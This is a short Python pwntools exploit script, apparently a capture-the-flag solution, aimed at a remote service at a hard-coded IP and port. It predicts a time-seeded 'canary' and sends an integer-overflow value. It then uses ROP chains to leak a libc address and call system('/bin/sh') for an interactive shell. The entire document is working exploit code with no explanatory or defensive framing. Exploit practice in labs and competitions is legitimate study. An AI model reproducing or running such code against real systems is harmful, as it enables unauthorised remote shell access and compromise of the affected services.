#!/usr/bin/env python
from pwn import *
from ctypes import *

context.arch = 'amd64'

host = '60.251.236.18'
y = remote( host , 10004 )

libc = ELF( './libc-2.27.so' )

l = CDLL( '/lib/x86_64-linux-gnu/libc.so.6' )
l.srand( l.time(0) )

canary = ''

for i in range( 0x10 ):
    canary += chr( l.rand() & 0xff )

y.sendafter( '>' , str( 2147483648 ) )

ret = 0x401016
pop_rdi = 0x40144b
pop_rsi_r15 = 0x401449
main = 0x4012af
puts_plt = 0x401060


p = flat(
    pop_rdi,
    0x403ff0, # __libc_start_main got
    puts_plt,
    main,
)

y.sendafter( '>' , 'a' * 0x100 + canary + p64( 0 ) * 3 + p )

l.srand( l.time(0) )

canary = ''

for i in range( 0x10 ):
    canary += chr( l.rand() & 0xff )


y.recvuntil( ':)\n' )

libc.address = u64( y.recv(6) + '\0\0' ) - libc.sym.__libc_start_main
success( 'libc -> %s' % hex( libc.address ) )

y.sendafter( '>' , str( 2147483648 ) )

p = flat(
    pop_rdi,
    libc.search( '/bin/sh' ).next(), # __libc_start_main got
    libc.sym.system
)

y.sendafter( '>' , 'a' * 0x100 + canary + p64( 0 ) * 3 + p )


y.interactive()